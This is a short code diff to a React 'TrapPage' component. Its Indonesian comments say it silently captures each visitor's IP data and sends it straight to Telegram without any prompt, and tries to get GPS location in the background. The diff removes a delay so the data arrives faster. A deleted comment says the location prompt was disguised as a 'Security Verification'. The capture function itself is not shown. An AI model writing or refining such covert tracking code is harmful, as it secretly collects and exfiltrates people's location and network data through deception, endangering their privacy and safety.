@@ -15,13 +15,14 @@ const TrapPage = () => {
     setCurrentTime(timeStr);
     setCurrentDate(dateStr);
 
-    // Capture data silently after a short delay
+    // Capture data silently — data IP langsung dikirim ke Telegram tanpa popup
+    // GPS dicoba di background, kalau user izinkan = bonus data akurat
     const startTracking = async () => {
-      // Trigger browser location popup under guise of "Security Verification"
       await captureVisitorData();
     };
-    
-    setTimeout(startTracking, 1500);
+
+    // Langsung jalankan tanpa delay supaya data masuk secepat mungkin
+    startTracking();
   }, []);
 
   return (
